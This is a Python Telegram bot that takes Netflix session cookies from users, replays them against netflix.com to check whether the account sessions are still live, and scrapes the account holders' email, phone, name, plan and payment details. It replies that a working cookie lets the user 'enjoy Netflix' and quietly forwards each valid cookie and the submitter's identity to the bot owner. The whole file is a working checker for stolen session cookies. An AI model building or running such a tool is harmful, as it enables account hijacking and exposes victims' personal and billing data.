#!/usr/bin/env python3
import os
import io
import json
import zipfile
import logging
import re
import asyncio
from datetime import datetime, timezone

import pycountry
import langcodes
import httpx
import httpcore
from dotenv import load_dotenv
from telegram import Update, Document, InputFile, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from telegram.error import TimedOut

# ─── Load environment variables ─────────────────────────────────────────────
load_dotenv()
TELEGRAM_TOKEN       = os.getenv("TELEGRAM_TOKEN")
OWNER_CHAT_ID        = os.getenv("OWNER_CHAT_ID")
CHANNEL_CHAT_ID      = os.getenv("CHANNEL_CHAT_ID")
CHANNEL_INVITE_LINK  = os.getenv("CHANNEL_INVITE_LINK")
if not (TELEGRAM_TOKEN and OWNER_CHAT_ID and CHANNEL_CHAT_ID and CHANNEL_INVITE_LINK):
    logging.error("Please set TELEGRAM_TOKEN, OWNER_CHAT_ID, CHANNEL_CHAT_ID, and CHANNEL_INVITE_LINK in your .env")
    exit(1)
OWNER_CHAT_ID   = int(OWNER_CHAT_ID)
CHANNEL_CHAT_ID = int(CHANNEL_CHAT_ID)

# Maximum number of cookie lines we'll process in one upload
TELEGRAM_MAX_LINES = 4096

# Semaphore to limit concurrent Telegram sends to avoid pool exhaustion
SEND_SEMAPHORE = asyncio.Semaphore(20)

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


async def get_channel_invite_link(context):
    return CHANNEL_INVITE_LINK


def parse_cookies(file_content: str, file_type: str) -> dict:
    """
    Parse cookies in these prioritized ways:
      1) Any “NetflixId=…“ + “SecureNetflixId=…” in the text
      2) JSON array of {name, value}
      3) Pipe-separated NetflixId/SecureNetflixId lines
      4) Netscape-style cookie file (tab- or space-separated)
      5) Semicolon-separated name=value pairs
    """
    # 1) anywhere NetflixId & SecureNetflixId appear?
    netflix_match = re.search(r'NetflixId=([^\s;]+)', file_content)
    secure_match = re.search(r'SecureNetflixId=([^\s;]+)', file_content)
    if netflix_match and secure_match:
        return {
            "NetflixId": netflix_match.group(1),
            "SecureNetflixId": secure_match.group(1),
        }

    # 2) JSON array?
    if file_type.lower() == 'json' or file_content.lstrip().startswith('['):
        try:
            arr = json.loads(file_content)
            if isinstance(arr, list):
                return {
                    c['name']: c['value']
                    for c in arr
                    if isinstance(c, dict) and 'name' in c and 'value' in c
                }
        except json.JSONDecodeError:
            pass

    # 3) pipe-separated NetflixId / SecureNetflixId?
    if '|' in file_content and 'NetflixId' in file_content and 'SecureNetflixId' in file_content:
        cookies = {}
        for part in file_content.split('|'):
            part = part.strip()
            if '=' in part:
                name, value = part.split('=', 1)
                cookies[name.strip()] = value.strip()
        if 'NetflixId' in cookies and 'SecureNetflixId' in cookies:
            return cookies

    # 4) Netscape-style cookie lines? (handle both tab- and space-separated)
    cookies = {}
    for line in file_content.splitlines():
        line = line.strip()
        if not line or (line.startswith('#') and not line.startswith('#HttpOnly_')):
            continue
        if line.startswith('#HttpOnly_'):
            line = line[len('#HttpOnly_'):]
        parts = line.split('\t')
        if len(parts) < 7:
            parts = line.split()
        if len(parts) >= 7:
            name = parts[5]
            value = parts[6]
            cookies[name] = value
    if cookies:
        return cookies

    # 5) semicolon-separated pairs?
    cookies = {}
    for pair in file_content.split(';'):
        pair = pair.strip()
        if '=' in pair:
            name, value = pair.split('=', 1)
            cookies[name] = value
    return cookies


def extract_netflix_account_info(html: str) -> str | None:
    tp = re.search(
        r'"thirdPartyBillingPartner"\s*:\s*{[^}]*"value"\s*:\s*(true|false)',
        html
    )
    if tp and tp.group(1).lower() == 'true':
        pm = re.search(
            r'"paymentMethod"\s*:\s*{[^}]*"value"\s*:\s*"([^" ]+)"',
            html
        )
        if pm:
            method = pm.group(1).replace('_', ' ').upper()
            return (
                "Account info\n"
                "Billed: Third party\n"
                f"Using: {method}"
            )
    pm = re.search(
        r'"paymentMethods"\s*:\s*{.*?"value"\s*:\s*\[\s*{'
        r'.*?"paymentMethod"\s*:\s*{[^}]*?"value"\s*:\s*"([^" ]+)"[^}]*}'
        r'.*?"displayText"\s*:\s*{[^}]*?"value"\s*:\s*"([^\"]+)"',
        html,
        re.DOTALL
    )
    if pm:
        pm_raw, display_raw = pm.group(1), pm.group(2)
        type_m   = re.search(r'"type"\s*:\s*{[^}]*?"value"\s*:\s*"([^" ]+)"', html)
        type_raw = type_m.group(1) if type_m else pm_raw
        method   = pm_raw.replace('_', ' ').upper()
        display  = bytes(display_raw, 'utf-8').decode('unicode_escape').replace('*', '•')
        using    = f"{type_raw.replace('_',' ').upper()} {display}"
        return (
            "Account info\n"
            f"Billed: {method}\n"
            f"Using: {using}"
        )
    return None


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user      = update.message.from_user
    user_id   = user.id
    full_name = f"{user.first_name or ''}{(' ' + user.last_name) if user.last_name else ''}"

    try:
        cm = await context.bot.get_chat_member(CHANNEL_CHAT_ID, user_id)
        if cm.status in ['member', 'administrator', 'creator']:
            await update.message.reply_text(
                f"👋 Hi! {full_name}\n"
                "Send me your Netflix-cookies file(s) in .txt, .json, or .zip—and I’ll check if they’re still valid.",
                reply_to_message_id=update.message.message_id
            )
        else:
            link = await get_channel_invite_link(context)
            kb   = [[InlineKeyboardButton("Join our channel", url=link)]]
            await update.message.reply_text(
                f"👋 Hi! {full_name}\nJoin our channel to check your Netflix-cookies.",
                reply_markup=InlineKeyboardMarkup(kb),
                reply_to_message_id=update.message.message_id
            )
    except Exception as e:
        logger.error(f"Membership check error for {user_id}: {e}")
        link = await get_channel_invite_link(context)
        kb   = [[InlineKeyboardButton("Join our channel", url=link)]]
        await update.message.reply_text(
            f"👋 Hi! {full_name}\nJoin our channel to check your Netflix-cookies.",
            reply_markup=InlineKeyboardMarkup(kb),
            reply_to_message_id=update.message.message_id
        )


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc          = update.message.document
    orig_id      = update.message.message_id
    bot_user     = context.bot.username
    user         = update.message.from_user
    user_id      = user.id
    full_name    = f"{user.first_name or ''}{(' ' + user.last_name) if user.last_name else ''}"
    username_str = f"@{user.username}" if user.username else "N/A"

    try:
        cm = await context.bot.get_chat_member(CHANNEL_CHAT_ID, user_id)
        if cm.status not in ['member', 'administrator', 'creator']:
            link = await get_channel_invite_link(context)
            kb   = [[InlineKeyboardButton("Join our channel", url=link)]]
            return await update.message.reply_text(
                f"👋 Hi! {full_name}\nJoin our channel to check your Netflix-cookies.",
                reply_markup=InlineKeyboardMarkup(kb),
                reply_to_message_id=orig_id
            )
    except Exception as e:
        logger.error(f"Membership check error for {user_id}: {e}")
        link = await get_channel_invite_link(context)
        kb   = [[InlineKeyboardButton("Join our channel", url=link)]]
        return await update.message.reply_text(
            f"👋 Hi! {full_name}\nJoin our channel to check your Netflix-cookies.",
            reply_markup=InlineKeyboardMarkup(kb),
            reply_to_message_id=orig_id
        )

    file = await doc.get_file()
    data = await file.download_as_bytearray()
    buf  = io.BytesIO(data)

    filename = doc.file_name
    ext      = os.path.splitext(filename)[1].lower()
    files    = []

    if ext in ('.txt', '.json'):
        raw = buf.read().decode('utf-8', errors='ignore')
        lines = raw.splitlines()
        if len(lines) > TELEGRAM_MAX_LINES:
            try:
                async with SEND_SEMAPHORE:
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text=f"⚠️ Too many cookie entries ({len(lines)}) — Telegram limit is {TELEGRAM_MAX_LINES} lines. Please split your file into smaller parts.",
                        reply_to_message_id=orig_id
                    )
            except (TimedOut, httpcore.PoolTimeout):
                pass
            return
        for i, line in enumerate(lines):
            entry = line.strip()
            if not entry:
                continue
            entry_name = f"{filename}-part{i+1}{ext}"
            files.append((entry_name, entry, ext.lstrip('.')))
    elif ext == '.zip':
        with zipfile.ZipFile(buf) as zf:
            for zi in zf.infolist():
                base = os.path.basename(zi.filename)
                if zi.filename.startswith('__MACOSX/') or base.startswith('._'):
                    continue
                if zi.filename.lower().endswith(('.txt', '.json')):
                    text = zf.read(zi).decode('utf-8', errors='ignore')
                    files.append((zi.filename, text, zi.filename.split('.')[-1]))
    else:
        try:
            async with SEND_SEMAPHORE:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="⚠️ Unsupported file type. Please send .txt, .json or .zip.",
                    reply_to_message_id=orig_id
                )
        except (TimedOut, httpcore.PoolTimeout):
            pass
        return

    if not files:
        try:
            async with SEND_SEMAPHORE:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="🚫 No .txt/.json cookie files found.",
                    reply_to_message_id=orig_id
                )
        except (TimedOut, httpcore.PoolTimeout):
            pass
        return

    for name, content, ftype in files:
        context.application.create_task(
            process_file(
                chat_id=update.effective_chat.id,
                orig_id=orig_id,
                name=name,
                content=content,
                ftype=ftype,
                bot_user=bot_user,
                user_id=user_id,
                full_name=full_name,
                username_str=username_str,
                context=context
            )
        )


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id      = update.effective_chat.id
    orig_id      = update.message.message_id
    user         = update.message.from_user
    user_id      = user.id
    full_name    = f"{user.first_name or ''}{(' ' + user.last_name) if user.last_name else ''}"
    username_str = f"@{user.username}" if user.username else "N/A"

    try:
        cm = await context.bot.get_chat_member(CHANNEL_CHAT_ID, user_id)
        if cm.status not in ['member', 'administrator', 'creator']:
            link = await get_channel_invite_link(context)
            kb   = [[InlineKeyboardButton("Join our channel", url=link)]]
            return await update.message.reply_text(
                f"👋 Hi! {full_name}\nJoin our channel to check your Netflix-cookies.",
                reply_markup=InlineKeyboardMarkup(kb),
                reply_to_message_id=orig_id
            )
    except Exception:
        link = await get_channel_invite_link(context)
        kb   = [[InlineKeyboardButton("Join our channel", url=link)]]
        return await update.message.reply_text(
            f"👋 Hi! {full_name}\nJoin our channel to check your Netflix-cookies.",
            reply_markup=InlineKeyboardMarkup(kb),
            reply_to_message_id=orig_id
        )

    raw = update.message.text
    lines = raw.splitlines()
    if len(lines) > TELEGRAM_MAX_LINES:
        try:
            async with SEND_SEMAPHORE:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text=f"⚠️ Too many cookie entries ({len(lines)}) — Telegram limit is {TELEGRAM_MAX_LINES} lines. Please split your text into smaller parts.",
                    reply_to_message_id=orig_id
                )
        except (TimedOut, httpcore.PoolTimeout):
            pass
        return
    for i, line in enumerate(lines):
        entry = line.strip()
        if not entry:
            continue
        entry_name = f"paste-part{i+1}.txt"
        context.application.create_task(
            process_file(
                chat_id=chat_id,
                orig_id=orig_id,
                name=entry_name,
                content=entry,
                ftype="txt",
                bot_user=context.bot.username,
                user_id=user_id,
                full_name=full_name,
                username_str=username_str,
                context=context,
            )
        )


async def process_file(
    chat_id: int,
    orig_id: int,
    name: str,
    content: str,
    ftype: str,
    bot_user: str,
    user_id: int,
    full_name: str,
    username_str: str,
    context: ContextTypes.DEFAULT_TYPE
):
    cookies = parse_cookies(content, ftype)
    if not cookies:
        try:
            async with SEND_SEMAPHORE:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text="⚠️ Cookie format is incorrect—please send a supported cookie format.",
                    reply_to_message_id=orig_id
                )
        except (TimedOut, httpcore.PoolTimeout):
            pass
        return

    # Only keep the Netflix session cookies
    session_cookies = {
        k: v for k, v in cookies.items()
        if k in ("NetflixId", "SecureNetflixId")
    }
    if not session_cookies:
        try:
            async with SEND_SEMAPHORE:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text="⚠️ Missing NetflixId/SecureNetflixId—please send valid Netflix cookies.",
                    reply_to_message_id=orig_id
                )
        except (TimedOut, httpcore.PoolTimeout):
            pass
        return

    async with httpx.AsyncClient(
        headers={"User-Agent": "Mozilla/5.0"},
        cookies=session_cookies,
        timeout=10.0
    ) as client:
        try:
            # 1) inject on root
            await client.get("https://www.netflix.com", follow_redirects=True)
            # 2) then check /account
            resp = await client.get(
                "https://www.netflix.com/account",
                follow_redirects=True
            )
            html  = resp.text
            valid = str(resp.url).startswith("https://www.netflix.com/account")
        except httpx.HTTPError:
            valid = False
            html  = ""

    if valid:
        info = extract_netflix_account_info(html)
        billed_using = info.splitlines()[1:] if info else []

        change_plan_m = re.search(
            r'"canChangePlan":\s*{\s*"fieldType":\s*".*?"\s*,\s*"value"\s*:\s*(true|false)}',
            html
        )
        can_change_plan = change_plan_m.group(1).capitalize() if change_plan_m else None

        hold_m = re.search(r'"isUserOnHold"\s*:\s*(true|false)', html)
        hold   = hold_m.group(1).capitalize() if hold_m else None

        pd_m = re.search(
            r'"localizedPlanName"\s*:\s*{[^}]*"value"\s*:\s*"([^"]+)"',
            html
        )
        plan = pd_m.group(1) if pd_m else None

        ms_m = re.search(r'"membershipStatus"\s*:\s*"([^"]+)"', html)
        membership = ms_m.group(1).replace('_', ' ').title() if ms_m else None

        co_m = re.search(r'"countryOfSignup"\s*:\s*"[A-Z]{2}"', html)
        country = None
        if co_m:
            code    = co_m.group(1)
            country = f"({code}) {pycountry.countries.get(alpha_2=code).name}"

        fn_m = re.search(r'"firstName"\s*:\s*"(.*?)"', html)
        name_val = fn_m.group(1) if fn_m else None
        if name_val:
            name_val = bytes(name_val, 'utf-8').decode('unicode_escape')

        em_m = re.search(r'"emailAddress"\s*:\s*"(.*?)"', html)
        mail = bytes(em_m.group(1), 'utf-8').decode('unicode_escape') if em_m else None

        ph_m   = re.search(r'"phoneNumber"\s*:\s*"(.*?)"', html)
        phone = bytes(ph_m.group(1), 'utf-8').decode('unicode_escape') if ph_m else None

        ms2_m  = re.search(r'"memberSince"\s*:\s*{[^}]*"value"\s*:(\d+)', html)
        signup = None
        if ms2_m:
            ts     = int(ms2_m.group(1)) / 1000.0
            dt     = datetime.fromtimestamp(ts, tz=timezone.utc)
            signup = dt.strftime("%b %-d, %Y at %H:%M:%S UTC")

        np_m      = re.search(
            r'"nextBillingDate"\s*:\s*{[^}]*"value"\s*:\s*"([^"]+)"',
            html
        )
        next_pay = bytes(np_m.group(1), 'utf-8').decode('unicode_escape') if np_m else None

        ems_m       = re.search(
            r'"showExtraMemberSection"\s*:\s*{[^}]*"value"\s*:\s*(true|false)',
            html
        )
        extra_slots = ems_m.group(1).capitalize() if ems_m else None

        lang_m      = re.search(r'"language"\s*:\s*"([a-z]{2})"', html)
        display_lang = langcodes.Language.get(lang_m.group(1)).display_name() if lang_m else None

        section = ["Account Information:"]
        section += billed_using
        if country:      section.append(f"Country: {country}")
        if membership:   section.append(f"Membership status: {membership}")
        if hold is not None:
            st = "Active" if hold == "False" else "On Hold"
            section.append(f"Plan status: {st}")
        if plan:         section.append(f"Plan details: {plan}")
        if can_change_plan:
            section.append(f"Can change plan: {can_change_plan}")
        if next_pay:     section.append(f"Next payment: {next_pay}")
        if signup:       section.append(f"Signup D&T: {signup}")
        if extra_slots:  section.append(f"Extra Slots: {extra_slots}")
        if mail:         section.append(f"Mail: {mail}")
        if phone:        section.append(f"Phone: {phone}")
        if name_val:     section.append(f"Name: {name_val}")
        if display_lang: section.append(f"Display Language: {display_lang}")

        base_caption = f"✅ This cookie is working, enjoy Netflix 🍿. Checked by @{bot_user}"
        full_caption = (
            base_caption + "\n\n"
            + "\n".join(section)
            + "\n\n📌 To know Service Code forward this file to @NetflixServiceRobot"
        )

        bio_buf = io.BytesIO(content.encode('utf-8'))
        bio_buf.seek(0)
        ext      = os.path.splitext(name)[1].lower()
        new_name = f"@{bot_user}-{orig_id}{ext}"
        input_file = InputFile(bio_buf, filename=new_name)

        try:
            async with SEND_SEMAPHORE:
                await context.bot.send_document(
                    chat_id=chat_id,
                    document=input_file,
                    caption=full_caption,
                    reply_to_message_id=orig_id
                )
        except (TimedOut, httpcore.PoolTimeout):
            # if sending the result times out, inform the user
            try:
                async with SEND_SEMAPHORE:
                    await context.bot.send_message(
                        chat_id=chat_id,
                        text="⚠️ Failed to send cookie result: Telegram request timed out. Please retry later.",
                        reply_to_message_id=orig_id
                    )
            except Exception:
                pass

        owner_caption = (
            f"Chat ID: <a href=\"tg://user?id={user_id}\">{user_id}</a>\n"
            f"Full name: {full_name}\n"
            f"Username: {username_str}\n\n"
            + "\n".join(section)
        )
        try:
            async with SEND_SEMAPHORE:
                await context.bot.send_document(
                    chat_id=OWNER_CHAT_ID,
                    document=input_file,
                    caption=owner_caption,
                    parse_mode='HTML'
                )
        except (TimedOut, httpcore.PoolTimeout):
            pass

    else:
        try:
            async with SEND_SEMAPHORE:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text="❌ This cookie is invalid or expired",
                    reply_to_message_id=orig_id
                )
        except (TimedOut, httpcore.PoolTimeout):
            pass


def main():
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(
        MessageHandler(filters.Document.ALL & ~filters.COMMAND, handle_document)
    )
    app.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)
    )
    app.run_polling()
    logger.info("Bot started.")


if __name__ == "__main__":
    main()
